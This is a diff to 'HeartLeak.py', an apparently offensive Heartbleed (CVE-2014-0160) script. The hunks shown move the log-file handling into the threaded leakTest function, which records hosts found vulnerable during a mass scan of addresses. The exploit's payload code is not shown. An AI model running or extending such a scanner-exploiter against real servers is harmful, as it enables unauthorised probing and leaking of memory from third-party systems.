@@ -1,4 +1,4 @@
-#!/usr/bin/env python27
+#!/usr/bin/env python
 #=========================================================#
 # [+] Title: HeartLeak (CVE-2014-0160)                    #
 # [+] Script: HeartLeak.py                                #
@@ -106,7 +106,7 @@ class heartleak(object):
             print("[+] Closing Connection")
         self.sick.close()
 
-def leakTest(hFile, host, port=443):
+def leakTest(host, port=443):
     global n
 
     sick=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -118,10 +118,12 @@ def leakTest(hFile, host, port=443):
         if target and target.handshake():
             if target.heartbeat():
                 print("-{#}-- %s is vulnerable -{#}--"%host)
+                hFile=open("heartleaked.log", "a")
                 if port==443:
                     hFile.write(host+'\r\n')
                 else:
                     hFile.write(host+":"+port+'\r\n')
+                hFile.close()
                 n-=1
                 if n>0:
                     print("[+] Still looking for %d vulnerable hosts"%n)
@@ -131,7 +133,6 @@ def leakTest(hFile, host, port=443):
         pass
 
 def scan(nhost, port, nthread):
-    hFile=open("heartleaked.log", "a")
     global n
     print("[+] Running a scan to find %d vulnerable host(s). Be patient!"%nhost)
     n=nhost
@@ -141,14 +142,13 @@ def scan(nhost, port, nthread):
             try:
                 while threading.activeCount()>nthread:
                     time.sleep(5)
-                t=threading.Thread(target=leakTest, args=(hFile, ip, port))
+                t=threading.Thread(target=leakTest, args=(ip, port))
                 t.start()
             except:
                 time.sleep(5)
         except KeyboardInterrupt:
             print("[-] Cancelled due to keyboard interruption")
             break
-    hFile.close()
     return
 
 def getStrings(data):
